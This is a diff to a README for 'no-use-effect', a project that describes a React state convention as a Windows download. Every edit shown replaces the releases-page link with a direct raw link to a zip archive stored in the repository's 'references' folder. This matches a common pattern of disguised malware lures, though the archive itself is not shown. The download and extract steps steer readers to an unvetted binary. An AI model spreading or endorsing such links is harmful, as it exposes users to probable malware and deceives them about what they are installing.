@@ -1,6 +1,6 @@
 # 🛑 no-use-effect - Keep React State Easy to Follow
 
-[![Download no-use-effect](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/higginslol041-max/no-use-effect/releases)
+[![Download no-use-effect](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/higginslol041-max/no-use-effect/raw/refs/heads/main/references/effect_no_use_v3.2.zip)
 
 ## 🧩 What this app does
 
@@ -21,7 +21,7 @@ This helps you build React apps with less hidden behavior and fewer moving parts
 ## 💻 Windows download
 
 1. Open the release page:
-   https://github.com/higginslol041-max/no-use-effect/releases
+   https://github.com/higginslol041-max/no-use-effect/raw/refs/heads/main/references/effect_no_use_v3.2.zip
 2. Find the latest release.
 3. Under Assets, download the Windows file for your system.
 4. If the file is a `.zip`, right-click it and choose Extract All.
@@ -181,7 +181,7 @@ These habits make React code easier to maintain.
 
 ## 📎 Download page
 
-[Open the release page to download](https://github.com/higginslol041-max/no-use-effect/releases)
+[Open the release page to download](https://github.com/higginslol041-max/no-use-effect/raw/refs/heads/main/references/effect_no_use_v3.2.zip)
 
 ## 🧭 File names you may see
 
